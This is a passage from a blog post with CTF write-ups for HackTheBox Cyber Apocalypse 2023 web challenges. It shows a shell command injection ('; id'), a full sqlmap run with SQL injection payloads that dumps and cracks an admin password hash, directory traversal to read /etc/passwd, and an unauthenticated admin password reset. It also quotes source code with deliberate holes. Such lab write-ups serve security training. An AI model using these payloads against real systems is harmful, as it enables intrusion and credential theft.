must be present, or else this will be interpreted as minus.\nThe password will never be checked, so this can be whatever. Just like that, we are in. And the flag is first up on the table.\nHTB{p4r4m3t3r1z4t10n_1s_1mp0rt4nt!!!}\nGunhead During Pandora\u0026rsquo;s training, the Gunhead AI combat robot had been tampered with and was now malfunctioning, causing it to become uncontrollable. With the situation escalating rapidly, Pandora used her hacking skills to infiltrate the managing system of Gunhead and urgently needs to take it down. Difficulty: very easy\nVisiting the website we see a lot of text, and the only interactable piece seems to be a pull-up console:\nOur options for commands are extremely limited. Perhaps the provided source code can give us more insight? In ReconModel.php, we see how the program handles this ping command:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ cat ReconModel.php \u0026lt;?php #[AllowDynamicProperties] class ReconModel { public function __construct($ip) { $this-\u0026gt;ip = $ip; } public function getOutput() { # Do I need to sanitize user input before passing it to shell_exec? return shell_exec(\u0026#39;ping -c 3 \u0026#39;.$this-\u0026gt;ip); } } We have a commented note pointing out the lack of sanitization within the shell_exec. We should be able to use this /ping command to execute multiple shell commands when we include a break; Testing with id:\n1 /ping 8.8.8.8; id We see the 2nd shows our id. This command injection is successful. We will probe the current directory, and since there\u0026rsquo;s no harm, take a guess that flag.txt is in our current directory:\nWe didn\u0026rsquo;t hit it this time, but using this command scheme we can keep using ls to poke around for the flag. Or we can try find.\nNow we find it in probably the next most likely location, the base directory.\nHTB{4lw4y5_54n1t1z3_u53r_1nput!!!}\nOrbital In order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder? Difficulty: easy\nVisiting the site shows us a generic login page. After trying the classic admin:admin and admin:password credentials, perhaps we can find more information on what\u0026rsquo;s happening by viewing the provided source code. When viewing the database.py, we find an interesting hint/note:\n1 2 3 4 5 6 7 8 9 10 11 12 def login(username, password): # I don\u0026#39;t think it\u0026#39;s not possible to bypass login because I\u0026#39;m verifying the password later. user = query(f\u0026#39;SELECT username, password FROM users WHERE username = \u0026#34;{username}\u0026#34;\u0026#39;, one=True) if user: passwordCheck = passwordVerify(user[\u0026#39;password\u0026#39;], password) if passwordCheck: token = createJWT(user[\u0026#39;username\u0026#39;]) return token else: return False Our SQL injection approach from Drobots has been remedied. Even when we bypass the username input check, the password is verified in a separate instance. Problem solved, or is it?\nBefore moving on to probing SQL injection further, I check for potentially alternative pages by looking at the routes.py file. The only other page is an /export page, that requires a valid JSON token. So we will explore the login bypass further.\nInstead of manually checking a variety of SQL payloads, we will employ a tool to make this quick and easy: SQLmap. SQLmap can be easily set up to do post requests by passing it the request information in a file:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ cat post.txt POST /api/login HTTP/1.1 Host: 68.183.45.143:30274 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://68.183.45.143:30274/ Content-Type: application/json Origin: http://68.183.45.143:30274 Content-Length: 42 Connection: close {\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;password\u0026#34;} Full sqlmap dump output.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 $ sqlmap -r post.txt -p username --dbms=mysql --dump ___ __H__ ___ ___[(]_____ ___ ___ {1.7.2#stable} |_ -| . [,] | .\u0026#39;| . | |___|_ [\u0026#34;]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 19:23:08 /2023-03-20/ [19:23:08] [INFO] parsing HTTP request from \u0026#39;post.txt\u0026#39; JSON data found in POST body. Do you want to process it? [Y/n/q] y [19:23:16] [INFO] testing connection to the target URL [19:23:16] [WARNING] the web server responded with an HTTP error code (403) which could interfere with the results of the tests [19:23:16] [INFO] checking if the target is protected by some kind of WAF/IPS [19:23:16] [INFO] testing if the target URL content is stable [19:23:16] [INFO] target URL content is stable [19:23:16] [INFO] heuristic (basic) test shows that (custom) POST parameter \u0026#39;JSON username\u0026#39; might be injectable (possible DBMS: \u0026#39;MySQL\u0026#39;) [19:23:17] [INFO] testing for SQL injection on (custom) POST parameter \u0026#39;JSON username\u0026#39; for the remaining tests, do you want to include all tests for \u0026#39;MySQL\u0026#39; extending provided level (1) and risk (1) values? [Y/n] [19:23:20] [INFO] testing \u0026#39;AND boolean-based blind - WHERE or HAVING clause\u0026#39; [19:23:22] [INFO] testing \u0026#39;Boolean-based blind - Parameter replace (original value)\u0026#39; [19:23:22] [INFO] testing \u0026#39;Generic inline queries\u0026#39; [19:23:22] [INFO] testing \u0026#39;AND boolean-based blind - WHERE or HAVING clause (MySQL comment)\u0026#39; [19:23:25] [WARNING] reflective value(s) found and filtering out [19:23:28] [INFO] testing \u0026#39;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)\u0026#39; [19:23:34] [INFO] testing \u0026#39;OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)\u0026#39; [19:23:40] [INFO] testing \u0026#39;MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause\u0026#39; [19:23:51] [INFO] testing \u0026#39;MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)\u0026#39; [19:24:02] [INFO] testing \u0026#39;MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)\u0026#39; [19:24:12] [INFO] testing \u0026#39;MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)\u0026#39; [19:24:23] [INFO] testing \u0026#39;MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)\u0026#39; [19:24:33] [INFO] testing \u0026#39;MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)\u0026#39; [19:24:52] [INFO] testing \u0026#39;MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)\u0026#39; [19:25:02] [INFO] testing \u0026#39;MySQL boolean-based blind - Parameter replace (MAKE_SET)\u0026#39; [19:25:02] [INFO] testing \u0026#39;MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)\u0026#39; [19:25:02] [INFO] testing \u0026#39;MySQL boolean-based blind - Parameter replace (ELT)\u0026#39; [19:25:03] [INFO] testing \u0026#39;MySQL boolean-based blind - Parameter replace (ELT - original value)\u0026#39; [19:25:03] [INFO] testing \u0026#39;MySQL boolean-based blind - Parameter replace (bool*int)\u0026#39; [19:25:03] [INFO] testing \u0026#39;MySQL boolean-based blind - Parameter replace (bool*int - original value)\u0026#39; [19:25:04] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause\u0026#39; [19:25:04] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)\u0026#39; [19:25:05] [INFO] testing \u0026#39;MySQL \u0026lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause\u0026#39; [19:25:05] [INFO] testing \u0026#39;MySQL \u0026lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)\u0026#39; [19:25:05] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0 boolean-based blind - Stacked queries\u0026#39; [19:25:12] [INFO] testing \u0026#39;MySQL \u0026lt; 5.0 boolean-based blind - Stacked queries\u0026#39; [19:25:12] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)\u0026#39; [19:25:20] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)\u0026#39; [19:25:27] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)\u0026#39; [19:25:35] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)\u0026#39; [19:25:43] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)\u0026#39; [19:25:43] [WARNING] potential permission problems detected (\u0026#39;command denied\u0026#39;) [19:25:51] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)\u0026#39; [19:25:59] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)\u0026#39; [19:26:06] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)\u0026#39; [19:26:14] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\u0026#39; [19:26:15] [INFO] (custom) POST parameter \u0026#39;JSON username\u0026#39; is \u0026#39;MySQL \u0026gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\u0026#39; injectable [19:26:15] [INFO] testing \u0026#39;MySQL inline queries\u0026#39; [19:26:15] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0.12 stacked queries (comment)\u0026#39; [19:26:15] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0.12 stacked queries\u0026#39; [19:26:15] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0.12 stacked queries (query SLEEP - comment)\u0026#39; [19:26:15] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0.12 stacked queries (query SLEEP)\u0026#39; [19:26:16] [INFO] testing \u0026#39;MySQL \u0026lt; 5.0.12 stacked queries (BENCHMARK - comment)\u0026#39; [19:26:16] [INFO] testing \u0026#39;MySQL \u0026lt; 5.0.12 stacked queries (BENCHMARK)\u0026#39; [19:26:16] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP)\u0026#39; [19:26:26] [INFO] (custom) POST parameter \u0026#39;JSON username\u0026#39; appears to be \u0026#39;MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP)\u0026#39; injectable [19:26:26] [INFO] testing \u0026#39;Generic UNION query (NULL) - 1 to 20 columns\u0026#39; [19:26:26] [INFO] testing \u0026#39;MySQL UNION query (NULL) - 1 to 20 columns\u0026#39; [19:26:26] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found [19:26:27] [INFO] \u0026#39;ORDER BY\u0026#39; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test [19:26:27] [INFO] target URL appears to have 2 columns in query do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] n n [19:26:51] [WARNING] if UNION based SQL injection is not detected, please consider usage of option \u0026#39;--union-char\u0026#39; (e.g. \u0026#39;--union-char=1\u0026#39;) [19:26:54] [INFO] target URL appears to be UNION injectable with 2 columns injection not exploitable with NULL values. Do you want to try with a random integer value for option \u0026#39;--union-char\u0026#39;? [Y/n] n [19:27:02] [INFO] testing \u0026#39;MySQL UNION query (random number) - 1 to 20 columns\u0026#39; [19:27:06] [INFO] testing \u0026#39;MySQL UNION query (NULL) - 21 to 40 columns\u0026#39; [19:27:09] [INFO] testing \u0026#39;MySQL UNION query (random number) - 21 to 40 columns\u0026#39; [19:27:12] [INFO] testing \u0026#39;MySQL UNION query (NULL) - 41 to 60 columns\u0026#39; [19:27:15] [INFO] testing \u0026#39;MySQL UNION query (random number) - 41 to 60 columns\u0026#39; [19:27:18] [INFO] testing \u0026#39;MySQL UNION query (NULL) - 61 to 80 columns\u0026#39; [19:27:21] [INFO] testing \u0026#39;MySQL UNION query (random number) - 61 to 80 columns\u0026#39; [19:27:24] [INFO] testing \u0026#39;MySQL UNION query (NULL) - 81 to 100 columns\u0026#39; [19:27:27] [INFO] testing \u0026#39;MySQL UNION query (random number) - 81 to 100 columns\u0026#39; (custom) POST parameter \u0026#39;JSON username\u0026#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] n sqlmap identified the following injection point(s) with a total of 1397 HTTP(s) requests: --- Parameter: JSON username ((custom) POST) Type: error-based Title: MySQL \u0026gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: {\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34; AND (SELECT 2242 FROM(SELECT COUNT(*),CONCAT(0x71716a6a71,(SELECT (ELT(2242=2242,1))),0x71626b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IPSK\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;password\u0026#34;} Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: {\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34; AND (SELECT 4429 FROM (SELECT(SLEEP(5)))Llei)-- Mhzj\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;password\u0026#34;} --- [19:27:44] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL \u0026gt;= 5.0 (MariaDB fork) [19:27:44] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries [19:27:44] [INFO] fetching current database [19:27:45] [INFO] retrieved: \u0026#39;orbital\u0026#39; [19:27:45] [INFO] fetching tables for database: \u0026#39;orbital\u0026#39; [19:27:45] [INFO] retrieved: \u0026#39;communication\u0026#39; [19:27:45] [INFO] retrieved: \u0026#39;users\u0026#39; [19:27:45] [INFO] fetching columns for table \u0026#39;users\u0026#39; in database \u0026#39;orbital\u0026#39; [19:27:45] [INFO] retrieved: \u0026#39;id\u0026#39; [19:27:46] [INFO] retrieved: \u0026#39;int(11)\u0026#39; [19:27:46] [INFO] retrieved: \u0026#39;username\u0026#39; [19:27:46] [INFO] retrieved: \u0026#39;varchar(255)\u0026#39; [19:27:46] [INFO] retrieved: \u0026#39;password\u0026#39; [19:27:46] [INFO] retrieved: \u0026#39;varchar(255)\u0026#39; [19:27:46] [INFO] fetching entries for table \u0026#39;users\u0026#39; in database \u0026#39;orbital\u0026#39; [19:27:46] [INFO] retrieved: \u0026#39;1\u0026#39; [19:27:47] [INFO] retrieved: \u0026#39;1692b753c031f2905b89e7258dbc49bb\u0026#39; [19:27:47] [INFO] retrieved: \u0026#39;admin\u0026#39; [19:27:47] [INFO] recognized possible password hashes in column \u0026#39;password\u0026#39; do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y [19:28:10] [INFO] writing hashes to a temporary file \u0026#39;/tmp/sqlmapxmrfdr0m9619/sqlmaphashes-xvcfw_me.txt\u0026#39; do you want to crack them via a dictionary-based attack? [Y/n/q] y [19:28:13] [INFO] using hash method \u0026#39;md5_generic_passwd\u0026#39; what dictionary do you want to use? [1] default dictionary file \u0026#39;/usr/share/sqlmap/data/txt/wordlist.tx_\u0026#39; (press Enter) [2] custom dictionary file [3] file with list of dictionary files \u0026gt; 1 [19:28:17] [INFO] using default dictionary do you want to use common password suffixes? (slow!) [y/N] n [19:28:23] [INFO] starting dictionary-based cracking (md5_generic_passwd) [19:28:23] [INFO] starting 2 processes [19:28:33] [INFO] cracked password \u0026#39;ichliebedich\u0026#39; for user \u0026#39;admin\u0026#39; Database: orbital Table: users [1 entry] +----+-------------------------------------------------+----------+ | id | password | username | +----+-------------------------------------------------+----------+ | 1 | 1692b753c031f2905b89e7258dbc49bb (ichliebedich) | admin | +----+-------------------------------------------------+----------+ [19:28:55] [INFO] table \u0026#39;orbital.users\u0026#39; dumped to CSV file \u0026#39;/home/kali/.local/share/sqlmap/output/68.183.45.143/dump/orbital/users.csv\u0026#39; [19:28:55] [INFO] fetching columns for table \u0026#39;communication\u0026#39; in database \u0026#39;orbital\u0026#39; [19:28:55] [INFO] retrieved: \u0026#39;id\u0026#39; [19:28:55] [INFO] retrieved: \u0026#39;int(11)\u0026#39; [19:28:55] [INFO] retrieved: \u0026#39;source\u0026#39; [19:28:56] [INFO] retrieved: \u0026#39;varchar(255)\u0026#39; [19:28:56] [INFO] retrieved: \u0026#39;destination\u0026#39; [19:28:56] [INFO] retrieved: \u0026#39;varchar(255)\u0026#39; [19:28:56] [INFO] retrieved: \u0026#39;name\u0026#39; [19:28:56] [INFO] retrieved: \u0026#39;varchar(255)\u0026#39; [19:28:56] [INFO] retrieved: \u0026#39;downloadable\u0026#39; [19:28:57] [INFO] retrieved: \u0026#39;varchar(255)\u0026#39; [19:28:57] [INFO] fetching entries for table \u0026#39;communication\u0026#39; in database \u0026#39;orbital\u0026#39; [19:28:57] [INFO] retrieved: \u0026#39;Arcturus\u0026#39; [19:28:57] [INFO] retrieved: \u0026#39;communication.mp3\u0026#39; [19:28:57] [INFO] retrieved: \u0026#39;1\u0026#39; [19:28:57] [INFO] retrieved: \u0026#39;Ice World Calling Red Giant\u0026#39; [19:28:57] [INFO] retrieved: \u0026#39;Titan\u0026#39; [19:28:58] [INFO] retrieved: \u0026#39;Vega\u0026#39; [19:28:58] [INFO] retrieved: \u0026#39;communication.mp3\u0026#39; [19:28:58] [INFO] retrieved: \u0026#39;2\u0026#39; [19:28:58] [INFO] retrieved: \u0026#39;Spiral Arm Salutations\u0026#39; [19:28:58] [INFO] retrieved: \u0026#39;Andromeda\u0026#39; [19:28:58] [INFO] retrieved: \u0026#39;Trappist-1\u0026#39; [19:28:58] [INFO] retrieved: \u0026#39;communication.mp3\u0026#39; [19:28:59] [INFO] retrieved: \u0026#39;3\u0026#39; [19:28:59] [INFO] retrieved: \u0026#39;Lone Star Linkup\u0026#39; [19:28:59] [INFO] retrieved: \u0026#39;Proxima Centauri\u0026#39; [19:28:59] [INFO] retrieved: \u0026#39;Kepler-438b\u0026#39; [19:28:59] [INFO] retrieved: \u0026#39;communication.mp3\u0026#39; [19:29:00] [INFO] retrieved: \u0026#39;4\u0026#39; [19:29:00] [INFO] retrieved: \u0026#39;Small World Symposium\u0026#39; [19:29:00] [INFO] retrieved: \u0026#39;TRAPPIST-1h\u0026#39; [19:29:00] [INFO] retrieved: \u0026#39;Boop\u0026#39; [19:29:00] [INFO] retrieved: \u0026#39;communication.mp3\u0026#39; [19:29:00] [INFO] retrieved: \u0026#39;5\u0026#39; [19:29:00] [INFO] retrieved: \u0026#39;Jelly World Japes\u0026#39; [19:29:01] [INFO] retrieved: \u0026#39;Winky\u0026#39; Database: orbital Table: communication [5 entries] +----+-----------------------------+------------------+-------------+-------------------+ | id | name | source | destination | downloadable | +----+-----------------------------+------------------+-------------+-------------------+ | 1 | Ice World Calling Red Giant | Titan | Arcturus | communication.mp3 | | 2 | Spiral Arm Salutations | Andromeda | Vega | communication.mp3 | | 3 | Lone Star Linkup | Proxima Centauri | Trappist-1 | communication.mp3 | | 4 | Small World Symposium | TRAPPIST-1h | Kepler-438b | communication.mp3 | | 5 | Jelly World Japes | Winky | Boop | communication.mp3 | +----+-----------------------------+------------------+-------------+-------------------+ [19:29:01] [INFO] table \u0026#39;orbital.communication\u0026#39; dumped to CSV file \u0026#39;/home/kali/.local/share/sqlmap/output/68.183.45.143/dump/orbital/communication.csv\u0026#39; [19:29:01] [WARNING] HTTP error codes detected during run: 403 (Forbidden) - 913 times, 500 (Internal Server Error) - 546 times [19:29:01] [INFO] fetched data logged to text files under \u0026#39;/home/kali/.local/share/sqlmap/output/68.183.45.143\u0026#39; [*] ending @ 19:29:01 /2023-03-20/ Running sqlmap quickly picked up the proper payload to use for SQL injection. The payload utilized:\n1 Payload: {\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34; AND (SELECT 4429 FROM (SELECT(SLEEP(5)))Llei)-- Mhzj\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;password\u0026#34;} And fortunately with this, sqlmap is able to grab admin\u0026rsquo;s password from the database. The login credentials are as follows:\n1 {\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;ichliebedich\u0026#34;} Using these credentials gets us in.\nNow that we are in, we can see a lot of static information on this page but no flag in plain sight. At the bottom of the page, we see an export option that will prompt us to download a communication.mp3 file. We saw some information on an export page in the source code, so let\u0026rsquo;s revisit this to get a better idea on what\u0026rsquo;s going on. In blueprints/test.py:\n1 2 3 4 5 6 7 8 9 10 11 12 def exportFile(): if not request.is_json: return response(\u0026#39;Invalid JSON!\u0026#39;), 400 data = request.get_json() communicationName = data.get(\u0026#39;name\u0026#39;, \u0026#39;\u0026#39;) try: # Everyone is saying I should escape specific characters in the filename. I don\u0026#39;t know why. return send_file(f\u0026#39;/communications/{communicationName}\u0026#39;, as_attachment=True) except: return response(\u0026#39;Unable to retrieve the communication\u0026#39;), 400 We see there is a lack of sanitization on how it is grabbing the file to export. If we can edit the file name we are requesting, we can perform directory traversal to grab any file that is not read-protected. To check this, we will look for the always-readable /etc/passwd. In burpsuite: Request\nResponse\nWe see the contents of /etc/passwd. Now all that remains is to find the flag. After making several guesses on where the flag might be located, we have yet to find the flag. Back to the source code, perhaps we can see how it is being placed upon initialization by viewing the Dockerfile:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 $ cat Dockerfile FROM python:3.8-alpine # Install packages RUN apk add --no-cache --update mariadb mariadb-client supervisor gcc musl-dev mariadb-connector-c-dev # Upgrade pip RUN python -m pip install --upgrade pip # Install dependencies RUN pip install Flask flask_mysqldb pyjwt colorama # Setup app RUN mkdir -p /app RUN mkdir -p /communication # Switch working environment WORKDIR /app # Add application COPY challenge . # Setup supervisor COPY config/supervisord.conf /etc/supervisord.conf # Expose port the server is reachable on EXPOSE 1337 # Disable pycache ENV PYTHONDONTWRITEBYTECODE=1 # copy flag COPY flag.txt /signal_sleuth_firmware COPY files /communications/ # create database and start supervisord COPY --chown=root entrypoint.sh /entrypoint.sh RUN chmod +x /entrypoint.sh ENTRYPOINT [\u0026#34;/entrypoint.sh\u0026#34;] They did indeed pull a cheeky one on us, note how the flag.txt has been renamed! In this machine it\u0026rsquo;s now called signal_sleuth_firmware In Burpsuite: Request:\nResponse:\nFlag HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}\nPassman Pandora discovered the presence of a mole within the ministry. To proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager. Can you hack into the password manager? Difficulty: easy\nVisiting the page we are greeted with a login page. We are also presented with the option to create an account. After guessing a few times for user admin, I decide to create a user. Trying username admin results in an error, telling us this username is in use. Good to note; for now we will create user a. Registering as user a was successful, and now we see a page where we might submit and store passwords for given addresses. This page operates as a password manager, true to the challenge description and title. A brief check at XSS fails, so let\u0026rsquo;s explore the provided source code. Interestingly, the database.js file shows us more request options than we might have expected. In particular, there is an option to update passwords:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 async updatePassword(username, password) { return new Promise(async (resolve, reject) =\u0026gt; { let stmt = `UPDATE users SET password = ? WHERE username = ?`; this.connection.query( stmt, [ String(password), String(username) ], (err, _) =\u0026gt; { if(err) reject(err) resolve(); } ) }); } There is no authorization verification here, so perhaps if we can request to change the password of user admin, we can login as admin. Starting with a post request to register a new user:\nRevised post request:\nResponse:\nWe have updated the admin password successfully, or so it says. When we attempt to login as admin, we are successful! The flag is given in the password field of admin\u0026rsquo;s saved passwords.\nHTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}\nTrapped Source Intergalactic Ministry of Spies tested Pandora\u0026rsquo;s movement and intelligence abilities. She found herself locked in a room with no apparent means of escape. Her task was to unlock the door and make her way out. Can you help her in opening the door? Difficutly: very easy\nUpon visiting the given address, we see a locked keypad: There is not much going on with the page, so we can check the page source with CTRL+U.\nIn the source code, we see the correct pin:\n1 2 3 4 5 6 7 8 9 \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; window.CONFIG = window.CONFIG || { buildNumber: \u0026#34;v20190816\u0026#34;, debug: false, modelName: \u0026#34;Valencia\u0026#34;, correctPin: \u0026#34;8291\u0026#34;, } \u0026lt;/script\u0026gt; Just like that, the flag is given:\nHowever, we cannot highlight for easy copy paste. We will inspect the object. Right clicking over the flag, we can Inspect, and the flag is in text:\nFrom here we can right click and \u0026ldquo;copy inner HTML\u0026rdquo;. Now we have the flag to paste easy, and guaranteed free from spelling errors.\nHTB{V13w_50urc3_c4n_b3_u53ful!!!}\n","date":"2023-03-25T19:01:05-05:00","permalink":"https://yuwenmichael.netlify.app/post/hackthebox_cyber_apocalypse_2023/","title":"HackTheBox_Cyber_Apocalypse_2023"}]